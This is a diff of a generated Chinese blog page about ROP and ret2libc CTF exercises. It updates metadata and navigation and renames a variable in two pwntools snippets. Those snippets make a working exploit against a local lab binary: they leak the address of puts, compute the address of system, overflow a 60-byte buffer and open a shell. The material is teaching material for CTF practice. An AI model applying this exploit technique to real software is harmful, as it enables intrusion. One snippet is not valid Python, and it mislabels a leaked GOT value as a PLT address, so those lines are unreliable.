@@ -140,7 +140,7 @@
 <meta property="og:image" content="/2023/02/13/ROP学习II/8.png">
 <meta property="og:image" content="/2023/02/13/ROP学习II/7.png">
 <meta property="og:image" content="/2023/02/13/ROP学习II/9.png">
-<meta property="og:updated_time" content="2023-02-14T02:29:49.523Z">
+<meta property="og:updated_time" content="2023-02-14T03:54:23.712Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="ROP学习II">
 <meta name="twitter:description" content="前言上一节通过一个简单的ret2syscall题目认识了ROP。本节将通过三道ret2libc题目继续学习ROP。 学习ret2libc题目之前需要对plt和got有一定的了解。 GOT全称Global Offset Table，即全局偏移量表。它在可执行文件中是一个单独的section，位于.data section的前面。每个被目标模块引用的全局符号（函数或者变量）都对应于GOT中一个8字节的">
@@ -418,9 +418,9 @@
 <p>溢出数据大小通过反编译查看，得到大小为<code>56+4=60</code>字节</p>
 <p><img src="/2023/02/13/ROP学习II/9.png" alt="9"></p>
 <p>接着我们需要知道<code>system</code>函数在程序中的真实地址</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">elf = ELF(<span class="string">"./ret2libc3"</span>)</span><br><span class="line">libc = ELF(<span class="string">"libc-2.23.so"</span>)</span><br><span class="line">system@plt address  = libc.symbols[<span class="string">"system"</span>] - libc.symbols[<span class="string">"puts"</span>] + elf.got[<span class="string">"puts"</span>]</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">elf = ELF(<span class="string">"./ret2libc3"</span>)</span><br><span class="line">libc = ELF(<span class="string">"libc-2.23.so"</span>)</span><br><span class="line">system@plt address  = libc.symbols[<span class="string">"system"</span>] - libc.symbols[<span class="string">"puts"</span>] + puts_plt</span><br></pre></td></tr></table></figure>
 <p>最终exp构造如下构造如下</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">"./ret2libc3"</span>)</span><br><span class="line">elf = ELF(<span class="string">"./ret2libc3"</span>)</span><br><span class="line">libc = ELF(<span class="string">"/lib/i386-linux-gnu/libc.so.6"</span>) <span class="comment">#通过ldd找到程序在本机的libc地址</span></span><br><span class="line">io.sendlineafter(<span class="string">b" :"</span>,str(elf.got[<span class="string">"puts"</span>])) <span class="comment">#传入的是字符串</span></span><br><span class="line">io.recvuntil(<span class="string">b" : "</span>)</span><br><span class="line">puts_got = int(io.recvuntil(<span class="string">b"\n"</span>,drop = <span class="literal">True</span>),<span class="number">16</span>) <span class="comment">#得到puts函数的真实地址</span></span><br><span class="line">success(<span class="string">"puts_got -&gt; &#123;:#x&#125;"</span>.format(puts_got))</span><br><span class="line">payload = flat(cyclic(<span class="number">60</span>),puts_got+libc.symbols[<span class="string">"system"</span>]-libc.symbols[<span class="string">"puts"</span>],<span class="number">0xdeadbeef</span>,next(elf.search(<span class="string">b"sh\x00"</span>)))</span><br><span class="line">io.sendlineafter(<span class="string">b" :"</span>,payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">"./ret2libc3"</span>)</span><br><span class="line">elf = ELF(<span class="string">"./ret2libc3"</span>)</span><br><span class="line">libc = ELF(<span class="string">"/lib/i386-linux-gnu/libc.so.6"</span>) <span class="comment">#通过ldd找到程序在本机的libc地址</span></span><br><span class="line">io.sendlineafter(<span class="string">b" :"</span>,str(elf.got[<span class="string">"puts"</span>])) <span class="comment">#传入的是字符串</span></span><br><span class="line">io.recvuntil(<span class="string">b" : "</span>)</span><br><span class="line">puts_plt = int(io.recvuntil(<span class="string">b"\n"</span>,drop = <span class="literal">True</span>),<span class="number">16</span>) <span class="comment">#得到puts函数的真实地址</span></span><br><span class="line">success(<span class="string">"puts_plt -&gt; &#123;:#x&#125;"</span>.format(puts_plt))</span><br><span class="line">payload = flat(cyclic(<span class="number">60</span>),puts_plt+libc.symbols[<span class="string">"system"</span>]-libc.symbols[<span class="string">"puts"</span>],<span class="number">0xdeadbeef</span>,next(elf.search(<span class="string">b"sh\x00"</span>)))</span><br><span class="line">io.sendlineafter(<span class="string">b" :"</span>,payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
 <h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p><a href="https://www.bilibili.com/video/BV1854y1y7Ro" target="_blank" rel="noopener">https://www.bilibili.com/video/BV1854y1y7Ro</a></p>
 <p><a href="https://www.freebuf.com/articles/web/283330.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/283330.html</a></p>
 <p><a href="https://luomuxiaoxiao.com/?p=578" target="_blank" rel="noopener">https://luomuxiaoxiao.com/?p=578</a></p>
@@ -463,6 +463,10 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2023/02/27/读书分享III/" rel="prev" title="读书分享III">
+                读书分享III <i class="fa fa-chevron-right"></i>
+              </a>
             
           </div>
         </div>
@@ -541,7 +545,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">82</span>
+                  <span class="site-state-item-count">83</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
